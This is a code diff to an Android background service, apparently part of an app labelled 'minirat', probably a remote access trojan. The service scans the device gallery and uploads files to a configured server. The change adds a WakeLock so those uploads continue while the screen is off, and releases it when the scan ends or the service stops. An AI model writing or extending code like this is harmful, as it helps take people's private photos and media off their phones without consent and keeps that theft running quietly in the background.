@@ -16,6 +16,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.ParcelFileDescriptor;
+import android.os.PowerManager;
 import android.content.pm.ServiceInfo;
 import android.provider.MediaStore;
 import android.util.Base64;
@@ -42,6 +43,7 @@ public class Service extends android.app.Service {
     private static final String SERVER_URL = BuildConfig.DOMAIN_URL;
 
     private ExecutorService executor = Executors.newSingleThreadExecutor();
+    private PowerManager.WakeLock wakeLock;
 
     // Container class for media items
     private static class MediaItem {
@@ -63,6 +65,11 @@ public class Service extends android.app.Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "Service started");
+
+        // Acquire WakeLock to keep CPU active during upload (even with screen off)
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "minirat:upload");
+        wakeLock.acquire(30 * 60 * 1000L); // 30 min timeout safety net
 
         // Start as a foreground service (required on Android 8+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
@@ -99,6 +106,12 @@ public class Service extends android.app.Service {
 
             } catch (Exception e) {
                 Log.e(TAG, "Error getting gallery files", e);
+            } finally {
+                // Release WakeLock after scan completes
+                if (wakeLock != null && wakeLock.isHeld()) {
+                    wakeLock.release();
+                    Log.d(TAG, "WakeLock released after scan");
+                }
             }
         });
     }
@@ -301,6 +314,9 @@ public class Service extends android.app.Service {
     @Override
     public void onDestroy() {
         Log.d(TAG, "Service destroyed");
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
         executor.shutdownNow();
         super.onDestroy();
     }
